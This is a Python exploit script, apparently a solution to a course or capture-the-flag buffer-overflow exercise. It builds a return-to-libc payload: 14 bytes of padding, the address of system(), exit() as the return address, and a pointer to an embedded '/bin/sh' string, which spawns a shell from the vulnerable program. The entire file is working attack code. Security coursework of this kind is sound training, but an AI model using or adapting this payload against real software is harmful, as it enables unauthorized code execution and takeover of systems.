#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
# addr of system: 0x804fbf0
# addr of exit: 0x804ef40
# buff start: 0xfffef5a2

system = 0x804fbf0
exit   = 0x804ef40
buf_start = 0xfffef5a2

# buf[10] + saved EBP
offset_to_ret = 14

# where "/bin/sh" will start (26)
offset  = 26

temp = buf_start + offset

payload = b"A" * 14
payload += pack("<I", system)
payload += pack("<I", exit)
payload += pack("<I", temp)
payload += b"/bin/sh"

sys.stdout.buffer.write(payload)
